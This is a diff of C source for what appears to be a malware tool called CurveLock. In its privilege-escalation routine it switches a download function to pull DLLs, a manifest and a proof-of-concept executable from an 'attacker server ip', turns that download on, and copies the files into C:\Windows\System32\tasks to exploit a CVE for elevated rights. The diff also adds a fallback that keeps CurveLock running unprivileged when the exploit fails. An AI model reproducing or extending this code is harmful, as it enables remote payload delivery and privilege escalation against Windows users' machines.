@@ -242,18 +242,18 @@ BOOL DownloadFile(LPCSTR url, LPCSTR localFile) {
 }
 
 // Download Specific Files
-void DownloadFiles() {
-	const char* baseUrl = "http://www.curvelock.com/";
+void DownloadFilesForCVE() {
+	const char* baseUrl = "http://192.168.206.8/"; // Change as per attacker server ip
 	const char* files[] = {
 		"imm32.dll",
 		"TAPI32.Manifest",
-		"MsCtfMonior.dll",
+		"MsCtfMonitor.dll",
 		"POC_REMAP.exe"
 	};
 	const char* localFiles[] = {
 		"imm32.dll",
 		"TAPI32.Manifest",
-		"MsCtfMonior.dll",
+		"MsCtfMonitor.dll",
 		"POC_REMAP.exe"
 	};
 
@@ -284,8 +284,7 @@ void CopyFiles() {
 	const char* sourceFiles[] = {
 		"imm32.dll",
 		"TAPI32.manifest",
-		"CurveLock.exe",
-		"payload.png"
+		"CurveLock.exe"
 	};
 	const char* destinationPath = "C:\\Windows\\System32\\tasks\\";
 
@@ -324,7 +323,7 @@ BOOL DoPrivilegeEscalation() {
 			printf("[i] Process is not running at High Integrity Level. Patching It\n");
 			
 			// Downloading the required files
-			//DownloadFiles();
+			DownloadFilesForCVE();
 
 			// Copy CVE Files to C:\\Windows\\System32\\tasks
 			CopyFiles();
@@ -339,6 +338,7 @@ BOOL DoPrivilegeEscalation() {
 			}
 			else {
 				printf("[!] Failed to execute %s\n", command);
+				printf("[!] Continuing CurveLock with an Unprivileged Context\n");
 			}
 		}
 	}
